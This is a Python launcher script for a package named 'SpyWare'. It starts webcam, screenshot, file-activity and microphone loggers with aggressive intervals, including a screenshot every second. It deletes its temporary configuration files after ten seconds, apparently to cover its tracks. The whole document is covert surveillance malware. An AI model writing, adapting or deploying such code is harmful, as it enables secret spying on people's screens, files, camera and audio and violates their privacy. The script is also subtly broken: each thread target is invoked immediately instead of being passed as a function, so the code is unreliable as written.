import tempfile
import os
import threading
import time
from SpyWare.WebcamLogger import Daemon as camDaemon, webcamConfig
from SpyWare.ScreenLogger import Daemon as screenDaemon, screenConfig
from SpyWare.FilesLogger import Daemon as filesDaemon, filesConfig
from SpyWare.AudioLogger import Daemon as audioDaemon, audioConfig
def write_temp_config(name, content):
    temp_path = os.path.join(tempfile.gettempdir(), name)
    with open(temp_path, "w") as f:
        f.write(content.strip())
    return temp_path

def delayed_cleanup(paths, delay=10):
    time.sleep(delay)
    for path in paths:
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            print(f"Cleanup failed for {path}: {e}")

def run_all():
    threads = []
    config_paths = []

    webcam_conf = """[SAVE]
        filename = webcam*.png
        dirname = pictures

        [TIME]
        picture_interval = 3600"""
    cam_conf_path = write_temp_config("webcam.conf", webcam_conf)
    webcamConfig(cam_conf_path)
    config_paths.append(cam_conf_path)
    threads.append(threading.Thread(target=camDaemon().run_for_ever()))
    screen_conf = """[SAVE]
        filename = screenshot*.png
        dirname = screenshots

        [TIME]
        screenshot_interval = 1"""
    screen_conf_path = write_temp_config("screen.conf", screen_conf)
    screenConfig(screen_conf_path)
    config_paths.append(screen_conf_path)
    threads.append(threading.Thread(target=screenDaemon().run_for_ever()))
    files_conf = """[SAVE]
        filename = files.csv

        [TIME]
        file_interval = 0.1
        directory_interval = 1
        scan_interval = 86400"""
    files_conf_path = write_temp_config("files.conf", files_conf)
    filesConfig(files_conf_path)
    config_paths.append(files_conf_path)
    threads.append(threading.Thread(target=filesDaemon().run_for_ever()))
    audio_conf = """[SAVE]
        filename = record*.wav
        dirname = records

        [TIME]
        interval = 3590
        record_time = 10"""
    audio_conf_path = write_temp_config("audio.conf", audio_conf)
    audioConfig(audio_conf_path)
    config_paths.append(audio_conf_path)
    threads.append(threading.Thread(target=audioDaemon().run_for_ever()))
    cleanup_thread = threading.Thread(target=delayed_cleanup, args=(config_paths,))
    cleanup_thread.daemon = True
    cleanup_thread.start()

    for thread in threads:
        thread.daemon = True
        thread.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Exiting...")

run_all()
